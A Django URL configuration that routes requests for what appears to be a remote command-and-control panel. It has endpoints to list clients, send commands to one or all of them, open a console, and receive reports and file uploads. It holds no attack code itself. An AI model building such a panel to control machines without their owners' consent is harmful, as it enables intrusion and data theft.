from django.urls import path
from . import views

urlpatterns = [
    path('', views.index, name='index'),
    path('clients/', views.list_clients, name='clients'),
    path('clients/<int:client_id>', views.client_details, name='clientdetails'),
    path('command_all/', views.masscmd, name='command_all'),
    path('<int:client_id>/command', views.command, name='command'),
    path('<int:client_id>/console', views.console, name='console'),
    path('<int:client_id>/initial', views.getcmd, name='initial'),
    path('<int:client_id>/report', views.report, name='report'),
    path('<int:client_id>/upload', views.upload, name='upload'),
]
